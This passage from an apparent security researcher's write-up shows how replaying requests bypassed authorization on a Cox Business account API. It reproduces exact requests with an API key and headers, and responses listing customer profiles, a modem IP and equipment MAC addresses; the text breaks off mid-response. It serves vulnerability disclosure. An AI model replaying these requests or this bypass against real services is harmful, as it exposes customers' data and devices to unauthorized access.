response:\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"{\"}],\"\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"message\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Authorization Error-Invalid User Token\\\"\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"}\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"Invalid user token? But I’d just been able to hit this endpoint? I removed the word \",[\"$\",\"code\",null,{\"children\":\"test\",\"className\":\"__className_8a4d12\"}],\" from the URI and resent this request. Another authorization error! For some reason, the original endpoint without parameters was now returning an authorization error even though we could just hit it when running intruder.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"I did a sanity check and confirmed that nothing had changed between the request in intruder and my repeater request. I replayed the request one more time, but surprisingly this time it gave me the original 200 OK and the JSON response from intruder! What was going on? It seemed to be intermittently giving me authorization errors or saying that the request had been successful.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"To test if I could reproduce this with an actual search query, I wrote down \",[\"$\",\"code\",null,{\"children\":\"cox\",\"className\":\"__className_8a4d12\"}],\" in the URI and replayed the request 2-3 more times until I saw the following response:\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"{\"}],\"\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"message\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Success\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],\"\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"profile\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"{\"}],\"\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"numberofRecords\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"10000+ hits\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],\"\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"searchList\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"[\"}],\"\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"{\"}],\"\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"value\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"COX REDACTED\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],\"\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"profileGuid\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"cbbccdae-b1ab-4e8c-9cec-e20c425205a1\\\"\"}],\"\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],\"\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"{\"}],\"\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"value\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Cox Communications SIP Trunk REDACTED\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],\"\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"profileGuid\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"bc2a49c7-0c3f-4cab-9133-de7993cb1c7d\\\"\"}],\"\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],\"\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"{\"}],\"\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"value\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"cox test account ds1/REDACTED\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],\"\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"profileGuid\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"74551032-e703-46a2-a252-dc75d6daeedc\\\"\"}],\"\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"}\"}],\"\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"]\"}],\"\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"}\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"}\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Woah! These looked like profiles of Cox business customers. Not really expecting results, I replaced the word \\\"cox\\\" with \\\"fbi\\\" to see if it was actually pulling customer data:\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"{\"}],\"\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"message\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Success\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],\"\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"profile\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"{\"}],\"\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"numberofRecords\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"REDACTED hits\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],\"\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"searchList\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"[\"}],\"\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"{\"}],\"\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"value\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"FBI REDACTED\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],\"\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"profileGuid\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"7b9f092a-e938-41d5-bcf5-0be1bb6487f5\\\"\"}],\"\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],\"\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"{\"}],\"\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"value\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"FBI REDACTED\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],\"\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"profileGuid\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"c8923f6f-b4ed-4f66-a743-000a961edb35\\\"\"}],\"\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],\"\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"{\"}],\"\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"value\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"FBI REDACTED\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],\"\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"profileGuid\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"a32b8112-48ac-4a4f-8893-5ca1c392a31d\\\"\"}],\"\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"}\"}],\"\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"]\"}],\"\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"}\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"}\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Oh, no. The above response contained the physical addresses of several FBI field offices who were Cox business customers. The administrative customer search API request was working. Not good!\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"We had confirmed that we could bypass authorization for the API endpoints by simply replaying the HTTP request multiple times, and there were over 700 other API requests that we could hit. It was time to see what the real impact was.\"}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"confirming-we-can-access-anyones-equipment\",\"children\":\"Confirming We Can Access Anyone's Equipment\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"I looked back at the results of the intruder scan, now knowing that I could bypass authorization by simply replaying a request. In order to figure out if this vulnerability could've been used to hack my modem, I needed to know if this API had access to the residential network at an access control level. Cox offered both residential and business services, but under the hood, I was guessing that the underlying API had access to both.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"I went ahead and pulled out the simplest looking request that took in a \",[\"$\",\"code\",null,{\"children\":\"macAddress\",\"className\":\"__className_8a4d12\"}],\" parameter to test if I could access my own modem via the API.\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"children\":\"/api/cbma/accountequipment/services/accountequipment/ipAddress?macAddress=:mac\\n\",\"className\":\"__className_8a4d12\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"This was a GET request to retrieve a modem IP address that required a \",[\"$\",\"code\",null,{\"children\":\"macAddress\",\"className\":\"__className_8a4d12\"}],\" parameter. I logged into Cox, retrieved my own MAC address, then sent the HTTP request over-and-over until it returned 200 OK:\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/accountequipment/services/accountequipment/ipAddress?macAddress=f80c58bbcb90\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Host:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"myaccount-business.cox.com\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Clientid:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"cbmauser\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Apikey:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"5d228662-aaa1-4a18-be1c-fb84db78cf13\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Cb_session:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"unauthenticateduser\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Authorization:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Bearer\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"undefined\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"200\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"OK\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Content-type:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"application/json\"}],\"\\n\\n{\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"message\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Success\\\"\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"ipv4\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"98.165.155.8\\\"\"}],\"\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"It worked! We were accessing our own device through the Cox Business website API! This meant that whatever was running on this could actually be used to talk to the devices. Cox provided service to millions of customers, and this API seemingly allowed me to directly communicate via MAC address with anyone's device.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"The next question I had was whether or not we could retrieve the MAC addresses of the hardware connected to someone's account via searching their account ID (which we had retrieved previously through the customer query endpoint). I found the \",[\"$\",\"code\",null,{\"children\":\"accountequipment/services/accountequipment/v1/equipments\",\"className\":\"__className_8a4d12\"}],\" endpoint in my swagger list and threw it in my Burp Repeater with my own account ID. It returned the following information:\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/accountequipment/services/accountequipment/v1/equipments/435008132203\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Host:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"myaccount-business.cox.com\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Clientid:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"cbmauser\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Apikey:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"5d228662-aaa1-4a18-be1c-fb84db78cf13\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Cb_session:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"unauthenticateduser\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Authorization:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Bearer\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"undefined\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"200\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"OK\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Content-type:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"application/json\"}],\"\\n\\n{\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"accountEquipmentList\\\":\"}],\" [\\n    {\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"equipmentCategory\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Internet\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"equipmentModelMake\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"NOKIA G-010G-A\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"equipmentName\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"NOKIA G-010G-A\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"equipmentType\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Nokia ONT\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"itemModelMake\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"NOKIA\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"itemModelNumber\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"G-010G-A\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"itemNumber\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"DAL10GB\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"macAddress\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"f8:0c:58:bb:cb:92\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"portList\\\":\"}],\" [\\n        {\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"address\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"F80C58BBCB92\\\"\"}],\",\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"portNumber\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"1\\\"\"}],\",\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"portType\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"ONT_ALU\\\"\"}],\",\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"qualityAssuranceDate\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"20220121\\\"\"}],\",\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"serviceCategoryDescription\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Data\\\"\"}],\"\\n        }\\n      ],\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"serialNumber\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"ALCLEB313C84\\\"\"}],\"\\n    },\\n    {\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"equipmentCategory\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Voice\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"equipmentModelMake\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"CISCO DPQ3212\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"equipmentName\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"CISCO DPQ3212\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"equipmentType\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Cable Modem\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"itemModelMake\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"CISCO\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"itemModelNumber\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"DPQ3212\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"itemNumber\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"DSA321N\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"macAddress\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"e4:48:c7:0d:9a:71\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"portList\\\":\"}],\" [\\n        {\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"address\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"E448C70D9A71\\\"\"}],\",\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"portNumber\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"1\\\"\"}],\",\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"portType\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"DATA_D3\\\"\"}],\",\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"qualityAssuranceDate\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"20111229\\\"\"}],\",\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"serviceCategoryDescription\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Unknown\\\"\"}],\"\\n        },\\n        {\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"address\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"E448C70D9A75\\\"\"}],\",\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"portNumber\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"2\\\"\"}],\",\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"portType\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"TELEPHONY\\\"\"}],\",\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"qualityAssuranceDate\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"20111229\\\"\"}],\",\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"serviceCategoryCode\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"T\\\"\"}],\",\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"serviceCategoryDescription\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Telephone\\\"\"}],\"\\n        }\\n      ],\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"serialNumber\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"240880144\\\"\"}],\"\\n    },\\n    {\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"equipmentCategory\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Television\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"equipmentModelMake\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Cox Business TV (Contour 1)\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"equipmentName\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Cox Business TV (Contour 1)\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"equipmentType\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Cable Receiver\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"itemModelMake\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"CISCO\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"itemModelNumber\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"650\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"itemNumber\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"GSX9865\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"macAddress\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"50:39:55:da:93:05\\\"\"}],\",\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"portList\\\":\"}],\" [\\n        {\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"address\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"44E08EBB6DBC\\\"\"}],\",\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"portNumber\\\":\"}],\" 